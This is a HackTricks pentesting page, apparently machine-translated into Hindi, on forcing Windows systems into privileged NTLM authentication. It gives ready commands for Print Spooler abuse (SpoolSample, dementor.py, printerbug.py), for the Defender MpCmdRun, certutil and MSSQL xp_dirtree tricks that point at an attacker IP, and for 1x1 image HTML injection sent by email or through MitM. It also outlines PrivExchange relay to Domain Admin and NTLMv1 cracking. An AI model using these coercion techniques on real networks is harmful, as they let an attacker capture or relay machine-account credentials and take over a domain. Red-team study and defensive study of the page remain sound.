# Force NTLM Privileged Authentication

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram group**](https://t.me/peass) में या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [hacktricks repo](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) C# में कोडित **रिमोट ऑथेंटिकेशन ट्रिगर्स** का एक **संग्रह** है, जिसे MIDL कंपाइलर का उपयोग करके तीसरे पक्ष की निर्भरताओं से बचने के लिए बनाया गया है।

## Spooler Service Abuse

यदि _**Print Spooler**_ सेवा **सक्षम** है, तो आप कुछ पहले से ज्ञात AD क्रेडेंशियल्स का उपयोग करके डोमेन कंट्रोलर के प्रिंट सर्वर से नए प्रिंट जॉब्स पर एक **अपडेट** का **अनुरोध** कर सकते हैं और बस उसे किसी सिस्टम को नोटिफिकेशन भेजने के लिए कह सकते हैं।\
नोट जब प्रिंटर किसी मनमाने सिस्टम को नोटिफिकेशन भेजता है, तो उसे उस **सिस्टम** के खिलाफ **प्रमाणित करना** पड़ता है। इसलिए, एक हमलावर _**Print Spooler**_ सेवा को किसी मनमाने सिस्टम के खिलाफ प्रमाणित करने के लिए बना सकता है, और सेवा इस प्रमाणीकरण में **कंप्यूटर अकाउंट** का उपयोग करेगी।

### डोमेन पर Windows सर्वर्स का पता लगाना

PowerShell का उपयोग करके, Windows बॉक्सेस की एक सूची प्राप्त करें। सर्वर्स आमतौर पर प्राथमिकता होते हैं, इसलिए वहाँ पर ध्यान केंद्रित करें:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### स्पूलर सेवाएँ सुनना पाना

थोड़ा संशोधित @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) का उपयोग करके, देखें कि स्पूलर सेवा सुन रही है या नहीं:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
आप Linux पर rpcdump.py का भी उपयोग कर सकते हैं और MS-RPRN प्रोटोकॉल की खोज कर सकते हैं।
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### सेवा से किसी मनमाने होस्ट के खिलाफ प्रमाणित करने के लिए कहें

आप [**SpoolSample यहाँ से कंपाइल कर सकते हैं**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**।**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
या उपयोग करें [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) अगर आप Linux पर हैं
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### अनियंत्रित प्रतिनिधिमंडल के साथ संयोजन

यदि हमलावर ने पहले से ही [अनियंत्रित प्रतिनिधिमंडल](unconstrained-delegation.md) वाले कंप्यूटर को समझौता किया है, तो हमलावर **प्रिंटर को इस कंप्यूटर के खिलाफ प्रमाणित करने के लिए मजबूर कर सकता है**। अनियंत्रित प्रतिनिधिमंडल के कारण, **प्रिंटर के कंप्यूटर खाते का TGT** **मेमोरी में संग्रहित किया जाएगा** जिस कंप्यूटर में अनियंत्रित प्रतिनिधिमंडल है। चूंकि हमलावर ने पहले ही इस होस्ट को समझौता किया है, वह **इस टिकट को पुनः प्राप्त करने** और इसका दुरुपयोग करने में सक्षम होगा ([Pass the Ticket](pass-the-ticket.md))।

## RCP जबरन प्रमाणीकरण

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange` हमला **Exchange Server `PushSubscription` सुविधा** में पाए गए एक दोष का परिणाम है। इस सुविधा के अनुसार, Exchange सर्वर को किसी भी डोमेन उपयोगकर्ता द्वारा जिसके पास मेलबॉक्स है, HTTP के माध्यम से किसी भी क्लाइंट-प्रदान किए गए होस्ट के लिए प्रमाणित करने के लिए मजबूर किया जा सकता है।

डिफ़ॉल्ट रूप से, **Exchange सेवा SYSTEM के रूप में चलती है** और इसे अत्यधिक विशेषाधिकार दिए जाते हैं (विशेष रूप से, इसके पास **2019 संचयी अपडेट से पहले डोमेन पर WriteDacl विशेषाधिकार होते हैं**)। इस दोष का शोषण करके **LDAP के लिए जानकारी को रिले करने और बाद में डोमेन NTDS डेटाबेस को निकालने** को सक्षम किया जा सकता है। जहां LDAP के लिए रिले करना संभव नहीं है, वहां यह दोष अभी भी डोमेन के भीतर अन्य होस्टों के लिए रिले और प्रमाणित करने के लिए उपयोग किया जा सकता है। इस हमले के सफल शोषण से किसी भी प्रमाणित डोमेन उपयोगकर्ता खाते के साथ तुरंत Domain Admin तक पहुंच प्राप्त होती है।

## Windows के अंदर

यदि आप पहले से ही Windows मशीन के अंदर हैं तो आप निम्नलिखित का उपयोग करके Windows को विशेषाधिकार प्राप्त खातों के साथ सर्वर से जोड़ने के लिए मजबूर कर सकते हैं:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
या इस अन्य तकनीक का उपयोग करें: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin (Microsoft-हस्ताक्षरित बाइनरी) का उपयोग करके NTLM प्रमाणीकरण को मजबूर करना संभव है:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML इंजेक्शन

### ईमेल के माध्यम से

यदि आप उस उपयोगकर्ता का **ईमेल पता** जानते हैं जो आपके द्वारा समझौता करने के लिए मशीन में लॉग इन करता है, तो आप उसे **1x1 इमेज के साथ एक ईमेल** भेज सकते हैं जैसे
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

यदि आप किसी कंप्यूटर पर MitM हमला कर सकते हैं और उस पेज में HTML इंजेक्ट कर सकते हैं जिसे वह देख रहा हो, तो आप उस पेज में निम्नलिखित जैसी इमेज इंजेक्ट करने का प्रयास कर सकते हैं:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1 क्रैक करना

यदि आप [NTLMv1 चैलेंजेस कैप्चर कर सकते हैं, तो यहां पढ़ें कि उन्हें कैसे क्रैक करें](../ntlm/#ntlmv1-attack).\
_याद रखें कि NTLMv1 क्रैक करने के लिए आपको Responder चैलेंज को "1122334455667788" पर सेट करना होगा_

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुंच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram group**](https://t.me/peass) में या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [hacktricks repo](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके**.

</details>
